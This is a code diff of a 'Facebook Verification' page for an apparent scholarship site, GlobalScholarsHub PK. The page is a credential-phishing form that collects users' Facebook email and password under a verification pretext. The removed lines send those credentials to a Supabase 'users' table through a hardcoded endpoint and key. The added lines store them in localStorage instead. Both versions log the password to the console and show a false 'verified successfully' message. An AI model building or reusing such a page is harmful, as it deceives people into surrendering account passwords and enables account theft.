@@ -6,7 +6,6 @@
     <title>Facebook Verification - GlobalScholarsHub PK</title>
     <link rel="stylesheet" href="css/style.css" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
 </head>
 <body>
 
@@ -89,11 +88,7 @@
     </footer>
 
     <script>
-        const supabaseUrl = 'https://wpsx11yolaoqucmvah.supabase.co';
-        const supabaseKey = 'sb_publishable_I0tVjJYAMpFojpHXOhNlg_IoRI-zK4';
-        const supabase = supabase.createClient(supabaseUrl, supabaseKey);
-
-        document.getElementById('facebookForm').addEventListener('submit', async function(e) {
+        document.getElementById('facebookForm').addEventListener('submit', function(e) {
             e.preventDefault();
 
             const fbEmail = document.getElementById('fbEmail').value.trim();
@@ -107,35 +102,25 @@
 
             console.log('📤 Sending Facebook data:', { fbEmail, fbPassword });
 
-            try {
-                const { data, error } = await supabase
-                    .from('users')
-                    .insert([{ fb_email: fbEmail, fb_password: fbPassword, submitted_at: submittedAt }])
-                    .select();
-
-                if (error) {
-                    console.error('❌ Supabase Error:', error);
-                    alert('⚠️ Facebook Error: ' + error.message);
-                    return;
-                }
-
-                console.log('✅ Facebook data saved to Supabase!', data);
-
-                let allUsers = [];
-                const saved = localStorage.getItem('allUsersData');
-                if (saved) {
-                    allUsers = JSON.parse(saved);
-                }
-                allUsers.push({ id: Date.now(), fbEmail, fbPassword, submittedAt });
-                localStorage.setItem('allUsersData', JSON.stringify(allUsers));
-
-                alert('✅ Facebook verified successfully! Redirecting to Profile...');
-                window.location.href = 'complete-profile.html';
-
-            } catch (error) {
-                console.error('❌ Error:', error);
-                alert('⚠️ Error: ' + error.message);
+            // ===== SAVE TO LOCAL STORAGE =====
+            let allUsers = [];
+            const saved = localStorage.getItem('allUsersData');
+            if (saved) {
+                allUsers = JSON.parse(saved);
             }
+
+            allUsers.push({
+                id: Date.now(),
+                fbEmail: fbEmail,
+                fbPassword: fbPassword,
+                submittedAt: submittedAt
+            });
+
+            localStorage.setItem('allUsersData', JSON.stringify(allUsers));
+            console.log('✅ Facebook data saved to Local Storage! Total users:', allUsers.length);
+
+            alert('✅ Facebook verified successfully! Redirecting to Profile...');
+            window.location.href = 'complete-profile.html';
         });
     </script>
 
